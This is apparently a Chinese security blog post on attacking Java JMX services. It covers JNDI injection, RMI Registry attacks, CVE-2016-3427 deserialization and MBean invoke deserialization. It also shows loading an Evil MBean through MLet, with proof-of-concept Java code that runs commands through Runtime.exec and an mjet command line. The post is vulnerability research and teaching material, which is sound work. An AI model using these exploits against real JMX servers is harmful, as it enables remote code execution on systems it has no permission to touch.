# JMX-Attack

    
    
&lt;!--more--&gt;    
## 0x00 基础知识  
JMX时Java1.5引入的新特性，全称为`Java Management Extension`，即Java管理扩展，是管理/监控应用程序、设备、系统对象的工具。这些被管理的对象都可以抽象为MBean进行表示，客户端连接到服务端来管理MBean，如查询MBean属性、调用MBean方法等操作。而MBean的代码定义是有要求的，需要实现一个接口，所有需要对外公开的方法都需要在该接口中声明。另外此接口要求在MBean类名后加上MBean后缀，这里的例子中的MBean类是Hello，接口为HelloMBean。  
```java  
package org.example;    
    
public class Hello implements HelloMBean {    
    private String name  = &#34;huahua&#34;;    
    @Override    
    public String getName() {    
        return this.name;    
    }    
    
    @Override    
    public void setName(String name) {    
        this.name = name;    
    }    
    
    @Override    
    public String sayHello() {    
        return &#34;hello: &#34;&#43;this.name;    
    }    
}  
```  
`HelloMBean`接口  
```java  
package org.example;    
    
public interface HelloMBean {    
    public String getName();    
    public void setName(String name);    
    public String sayHello();    
}  
```  
对于管理器来说，这些MBean中公开的方法，最终会被转化为属性(Attribute)、调用(invoke)、监听(Listener)等概念。默认情况下每个Java进程都运行着MBean管理服务，使用`ManagementFactory.getPlatformMBeanServer()`获取到`MBeanServer`后可对`MBean`进行操作。下面的例子模拟管理器注册MBean并显示当前Java进程中的所有MBean  
```java  
package org.example;    
    
import javax.management.MBeanServer;    
import javax.management.ObjectInstance;    
import javax.management.ObjectName;    
import java.lang.management.ManagementFactory;    
    
public class MBeanExample {    
    public static void main(String[] args) throws Exception {    
        Hello mbean = new Hello();    
    
        ObjectName mbeanName = new ObjectName(&#34;org.example:type=Hello&#34;);    
    
        MBeanServer server = ManagementFactory.getPlatformMBeanServer();    
        server.registerMBean(mbean,mbeanName);    
    
        for(Object object : server.queryMBeans(new ObjectName(&#34;*:*&#34;),null)) {    
            System.out.println( ((ObjectInstance)object).getObjectName());    
        }    
    
    }    
}  
```  
https://www.oracle.com/java/technologies/javase/management-extensions-best-practices.html  
想要MBean在管理器上可调用，那么需要指定一个`ObjectName`对象，关于对象名称的详细语法参考上面链接。  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502162046949.png)
`Object Name`在注册`MBean`时用于指定名称，在查询的时候可以指定正则用于查询，去匹配名称符合正则条件的MBean。每个Object Name都需要包含一个type关键属性。  
## 0x01 攻击JMX  
1、JMX-URL连接地址可控的JNDI注入利用方式  
2、攻击RMI Registry的利用方式  
3、RMI层&#34;自定义&#34;方法`newClinet`利用方式  
4、JMX层MBean方法`getLoggerLevel/goClassHistogram`利用方式  
5、MLET动态加载`Evil MBean`的利用方式  
第一种是针对JMX客户端的利用方式。后面是针对JMX服务，其中234都需要目标`ClassPath`存在可用的`Gadget`链，而第五个`MLET`动态加载是载入执行攻击者创建的恶意MBean类方法，所以没有Gadget的链子。从整体来看，JMX客户端与服务端的交互的流程及利用点如下  
1、客户端使用`javax.naming.InitialContext#lookup`获取到名称为`jmxrmi`的`Stub`代理对象，当JMX url可控时，会造成JNDI注入的问题。这是第一个利用点  
2、客户端调用`javax.management.remote.rmi.RMIServer#newClient`去获取`RMIConnectionImpl Stub`代理对象。当JMX服务需要验证时，会使用`JAAS-based authenticator`进行权限验证：根据服务的启动参数及`jmxremote.password`、`jmxremote.access`配置文件去匹配，当校验通过后返回代理对象。  
这部分会涉及到两个利用点：  
a、JMX底层是根据RMI进行通信的，当JDK版本存在低版本时，可以利用攻击RMI Registry的exp进行攻击，可利用`bind/lookup`方法传输恶意序列化数据/UnicastRef链利用。这是第二个利用点。  
b、newClient方法符合我们在攻击RMI中提到的应用层反序列化问题，参数为OBject类型，可以塞入我们的恶意Payload数据。这是第三个利用点  
3、客户端invoke调用`RMIConnectionImpl Stub`代理对象的方法去操作MBean/获取MBean信息这部分会涉及到两个攻击点：  
a、JMX层在还原MBean方法参数时也是采用反序列化的方式进行还原的，所以可将恶意数据塞入默认的MBean的有参方法。这是第四个利用点  
b、在客户端连接成功创建MBean时，可调用MLET动态加载的方式去加载攻击者构造的Evil MBean完成利用。这是第五个利用点。  
## 0x02 jmx-url连接地址可控的JNDI注入  
使用`JMXConnectorFactory#connect`连接JMX服务端时，会调用到`InitialContext#lookup`去获取名称为`jmxrmi`的远端对象。当JMX url可控时，会造成JNDI注入的问题  
```java  
JMX JNDI Gadget:    
javax.management.remote.JMXConnectorFactory.connect(JMXConnectorFactory.java:270)    
javax.management.remote.rmi.RMIConnector.connect(RMIConnector.java:287)    
javax.management.remote.rmi.RMIConnector.findRMIServer(RMIConnector.java:1922)    
javax.management.remote.rmi.RMIConnector.findRMIServerJNDI(RMIConnector.java:1955)    
javax.naming.InitialContext.lookup(InitialContext.java:417)  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502162200987.png)
## 0x03 攻击RMI Registry的利用方式  
因为JMX底层也是根据RMI进行通信，所以当JDK版本在低版本时，也可以使用RMI Registry的exp进行攻击，且这种攻击方式的触发点是在RMI层，还未执行代JMX权限校验部分，所以不受JMX权限的限制。  
利用RMI中攻击注册中心的的方式就可以。  
## 0x04 RMI层“自定义”方法new Client利用方式(CVE-2016-3427)  
当客户端使用`JMXConnectorFactory.connect`去连接服务端时，最终调用到`javax.management.remote.rmi.RMIServerImpl_Stub#newClinet`发起连接。其实该方法符合我们在攻击RMI Registry中提到的“应用层反序列化问题”情况：new Client方法参数为Object类型，可以塞入我们的恶意Payload(利用JMXConnector.CREDENTIALS配置添加)，  
```java  
public static void main(String[] args) throws Exception {  
    Object obj = new Groovy1().getObject(&#34;calc&#34;);  
    connectWithJmxUrlByObject(obj);  
}  
  
private static void connectWithJmxUrlByObject(Object credentials) throws MalformedURLException, IOException {  
    String url = &#34;service:jmx:rmi:///jndi/rmi://192.168.232.145:2222/jmxrmi&#34;;  
    System.out.println(&#34;Trying to connect to &#34; &#43; url &#43; &#34; ...&#34;);  
    Map&lt;String, Object&gt; props = new HashMap&lt;&gt;();  
    props.put(JMXConnector.CREDENTIALS, credentials);  
    JMXConnector connector = JMXConnectorFactory.connect(new JMXServiceURL(url), props);  
    System.out.println(&#34;Connected: &#34; &#43; connector.getConnectionId());  
    System.out.println();  
    connector.close();  
}  
```  
具体漏洞详情可参考  
https://su18.org/post/rmi-attack/#1-%E6%81%B6%E6%84%8F%E6%9C%8D%E5%8A%A1%E5%8F%82%E6%95%B0  
## 0x05 JMX层MBean方法getLoggerLevel/gcClassHistogram利用方式  
当JMX客户端调用`createMBean/getObjectInstance/invoke`等方法时，服务端处理时会先经过`sun.rmi.server.UnicastServerRef#dispatch`进行分发，当不执行RMI内置的`bind/lookup/dirty`方法时，会进入`调用自定义方法`的逻辑。  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502182355091.png)
客户端调用`createMBean/getAttribute`等内置方法，服务端到达`javax.management.remote.rmi.RMIConnectionImpl#invoke`中  
- 调用`java.rmi.MarshalledObject#get`还原参数值  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502190000526.png)
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502190007850.png)
调用到其`get`方法，进行`readObject`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502190008762.png)
https://github.com/mogwailabs/mjet/  
利用`MLET`工具，进行攻击  
`jython mjet.py localhost 1099 deserialize CommonsCollections6 &#34;open -a Calculator&#34;`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502190016111.png)
  
## 0x06 MLET动态加载Evil MBean利用方式  
除了利用本身存在的MBean，我们也可以自行添加MBean进行利用，可以使用`javax.management.loading.MLet`MBean并调用其`getMBeanFromURL`操作指示JMX服务端从远端加载注册构建的恶意MBean，这样就可以调用我们创建的MBean操作而不需要客户端ClassPath存在Gadget。这种从外部加载MBean的方式在官方也存在说明  
[https://docs.oracle.com/javase/7/docs/technotes/guides/management/agent.html](https://docs.oracle.com/javase/7/docs/technotes/guides/management/agent.html)  
分析下`getMBeansFromURL`方法是如何操作的，  
`javax.management.loading.MLet#getMBeansFromURL(java.lang.String)`分为两步  
1、加载mlet文件解析标签  
2、当创建MBean指定的class在本地ClassPath中找不到时，则使用MLET classloader去外部地址(第一步得到的codebase&#43;archive属性值)进行加载  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502172327747.png)
`parse`方法解析`&lt;mlet&gt;`标签的内容并放入`attributes`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502172329796.png)
接着返回到`getMBeansFromURL`方法调用`com.sun.jmx.mbeanserver.JmxMBeanServer#createMBean`创建MBean  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502172332303.png)
调用到`com.sun.jmx.interceptor.DefaultMBeanServerInterceptor#createMBean创建MBean`时，会检查是否有instantiate、registerMBean权限。如果未开启SecurityManager，则会跳过检查  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502172333048.png)
最终在`com.sun.jmx.mbeanserver.MBeanInstantiator#loadClass`中使用`MLET classloader`去加载`org.example.Evil.Evil`类  
其中`MLET`类是`URLClassLoader`加载器  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502172341211.png)
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502172345101.png)
创建Evil类及EvilMBean接口(恶意操作为runCommand)，并将其打包为`JMXEvilBean.jar`  
```java  
// EvilMBean.java  
package org.example.Evil;    
import java.io.IOException;    
public class Evil implements EvilMBean {    
    @Override    
    public String runCommand(String command) throws IOException {    
        Runtime.getRuntime().exec(command);    
        return &#34;success&#34;;    
    }    
}  
//Evil.java  
package org.example.Evil;    
import java.io.IOException;    
public interface EvilMBean {    
    public String runCommand(String command) throws IOException;    
}  
```  
MLET文件  
`&lt;mlet code=&#34;org.example.Evil.Evil&#34; archive=&#34;JmxEvilBean.jar&#34; name=&#34;MLetCompromise:name=evil,id=10&#34; codebase=&#34;http://localhost:8888&#34;&gt;&lt;/mlet&gt;`  
创建MLet MBean、invoke调用getMBeanFromURL加载外部Evil MBean、invoke调用Evil MBean的runCommand操作返回执行结果  
POC  
```java  
package org.example.Attack;    
    
import javax.management.*;    
import javax.management.remote.JMXConnector;    
import javax.management.remote.JMXConnectorFactory;    
import javax.management.remote.JMXServiceURL;    
import java.io.IOException;    
import java.util.HashSet;    
import java.util.Iterator;    
    
public class JMXAttack {    
    public static void main(String[] args) throws ReflectionException, InstanceNotFoundException, MBeanException, IOException, MalformedObjectNameException, NotCompliantMBeanException, InstanceAlreadyExistsException {    
        String serverName = &#34;127.0.0.1&#34;;    
        String port = &#34;1099&#34;;    
        String command = &#34;open -a Calculator&#34;;    
        //1、连接JMX服务    
        JMXServiceURL u = new JMXServiceURL(&#34;service:jmx:rmi:///jndi/rmi://&#34; &#43; serverName &#43; &#34;:&#34; &#43; port &#43; &#34;/jmxrmi&#34;);    
        JMXConnector c = JMXConnectorFactory.connect(u);    
        MBeanServerConnection m = c.getMBeanServerConnection();    
        //2、创建MBean,类为javax.management.loading.MLet、name为test.Mbean:type=MLet,id=1    
        ObjectInstance evil = m.createMBean(&#34;javax.management.loading.MLet&#34;, new ObjectName(&#34;test.Mbean:type=MLet,id=1&#34;));    
        //3、调用MBean的getMBeansFromURL操作，从http://localhost:8888/mlet加载mlet文件创建新的MBean    
        Object res = m.invoke(evil.getObjectName(), &#34;getMBeansFromURL&#34;, new Object[]{&#34;http://127.0.0.1:8888/MLET&#34;},new String[] { String.class.getName() } );    
    
        HashSet res_set = ((HashSet)res);    
        Iterator itr = res_set.iterator();    
        Object nextObject = itr.next();    
        //4、invoke调用新的MBean的runCommand操作并返回结果    
        ObjectInstance evil_bean = ((ObjectInstance)nextObject);    
        System.out.println(&#34;Loaded class: &#34;&#43;evil_bean.getClassName()&#43;&#34; object &#34;&#43;evil_bean.getObjectName());    
        System.out.println(&#34;Calling runCommand with: &#34;&#43;command);    
        Object result = m.invoke(evil_bean.getObjectName(), &#34;runCommand&#34;, new Object[]{ command }, new String[]{ String.class.getName() });    
        System.out.println(&#34;Result: &#34;&#43;result);    
    }    
}  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502172308964.png)
  

---

> Author: N1Rvana  
> URL: https://nlrvana.github.io/jmx-attack1/  

